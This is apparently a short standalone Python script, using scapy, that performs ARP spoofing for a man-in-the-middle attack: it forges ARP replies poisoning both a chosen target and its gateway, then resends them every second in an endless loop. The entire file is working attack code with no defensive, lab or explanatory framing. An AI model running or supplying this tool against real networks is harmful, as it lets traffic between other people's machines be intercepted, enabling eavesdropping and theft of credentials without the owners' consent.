import time
import argparse
from scapy.all import ARP, Ether, sendp
from scapy.layers.l2 import getmacbyip

def arp(gateway_ip, tgt_mac, tgt_ip):
    eth = Ether()
    arp = ARP(psrc = gateway_ip, hwdst = tgt_mac, pdst = tgt_ip, op = "is-at")
    pkt = eth / arp
    return pkt

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'man in the middle')

    parser.add_argument('-t', dest = 'targetip', type = str, help = 'target ip')
    parser.add_argument('-g', dest = 'gatewayip', type = str, help = 'gateway ip')

    args = parser.parse_args()

    tgt_ip = args.targetip
    tgt_mac = getmacbyip(tgt_ip)
    gateway_ip = args.gatewayip
    gateway_mac = getmacbyip(gateway_ip)

    input('enter')

    pkt_station = arp(gateway_ip, tgt_mac, tgt_ip)
    pkt_gateway = arp(tgt_ip, gateway_mac, gateway_ip)

    print(pkt_station.show())
    print(pkt_gateway.show())

    while True:
        sendp(pkt_station)
        sendp(pkt_gateway)
        time.sleep(1)